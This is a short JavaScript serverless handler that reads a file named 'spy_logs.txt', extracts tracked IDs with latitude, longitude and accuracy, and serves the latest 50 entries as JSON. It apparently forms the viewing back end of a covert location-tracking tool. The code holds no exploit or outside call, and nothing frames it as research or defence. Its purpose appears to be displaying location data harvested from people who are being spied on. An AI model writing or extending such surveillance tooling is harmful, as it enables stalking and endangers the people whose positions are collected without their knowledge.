const fs = require('fs').promises;

exports.handler = async () => {
  try {
    const logsContent = await fs.readFile('/tmp/spy_logs.txt', 'utf8');
    const lines = logsContent.split('\n').filter(l => l.trim()).slice(-50);
    
    const logs = lines.map(line => {
      const match = line.match(/ID:([a-z0-9_]+).*?LAT:(-?\d+\.\d+).*?LON:(-?\d+\.\d+).*?ACC:(\d+\.?\d*)/i);
      if (match) {
        return {
          id: match[1],
          lat: parseFloat(match[2]),
          lon: parseFloat(match[3]),
          accuracy: parseFloat(match[4]),
          timestamp: line.split(' | ')[0]
        };
      }
      return null;
    }).filter(Boolean);
    
    return {
      statusCode: 200,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(logs)
    };
  } catch(e) {
    return {
      statusCode: 200,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify([])
    };
  }
};
